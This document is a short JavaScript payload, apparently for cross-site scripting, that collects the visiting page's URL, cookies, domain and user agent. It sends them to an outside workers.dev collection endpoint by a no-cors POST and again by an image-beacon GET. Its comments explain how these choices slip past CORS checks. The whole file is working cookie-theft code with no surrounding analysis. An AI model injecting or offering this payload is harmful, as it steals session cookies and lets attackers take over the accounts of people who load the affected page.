var data = JSON.stringify({
    url: window.location.href,
    cookie: document.cookie,
    domain: document.domain,
    ua: navigator.userAgent
});

// 1. POST as text/plain (Bypasses most CORS/Preflight blocks)
fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl', {
    method: 'POST',
    mode: 'no-cors', // Tells the browser: "Don't worry about the response"
    headers: { 'Content-Type': 'text/plain' }, 
    body: data
});

// 2. Backup: GET via Image (The most reliable "callback" in existence)
new Image().src = 'https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl?data=' + btoa(data);
